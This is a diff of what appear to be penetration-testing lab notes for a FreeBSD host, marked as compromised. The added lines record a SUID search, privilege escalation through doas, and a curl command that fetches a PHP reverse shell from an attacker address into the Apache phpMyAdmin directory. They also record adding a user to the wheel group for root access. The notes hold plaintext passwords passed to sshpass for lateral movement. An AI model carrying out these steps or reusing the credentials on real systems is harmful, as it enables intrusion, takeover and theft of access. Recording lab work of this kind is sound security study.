@@ -317,7 +317,7 @@ sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
 }
 ```
 
-# VM 8 .20
+# VM 8 .20 (pwned)
 - production
 ```
 PORT      STATE SERVICE VERSION
@@ -378,11 +378,26 @@ Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
 ```
 
 ## Root
-abusing doas (freebsd)
+abusing doas (freebsd): /usr/local/etc/doas.conf
+``` find / -perm -u=s -type f 2>/dev/null ``` indicates can use ```doas```
 ```
 1.  doas service apache24 onestart
+2. curl http://192.168.45.173:8000/shell.php -o /usr/local/www/apache24/data/phpMyAdmin/tmp/shell.php (rev shell inject)
+3. http://172.16.159.20/phpMyAdmin/tmp/shell.php
+
 
 ```
+
+## Post exploitation
+- Steps to Add a User to the wheel Group
+- pw usermod andrew -G wheel: This part of the command uses the pw utility to modify the user andrew and add them to the wheel group.
+```
+/usr/local/bin/doas pw usermod andrew -G wheel
+```
+- verify changes ``` group andrew ```
+- ``` doas -s ``` 
+- ``` sshpass -p "DRtajyCwcbWvH/9" ssh mountuser@172.16.10.21`
+
 # VM 9 .21
 - FILES
 ```
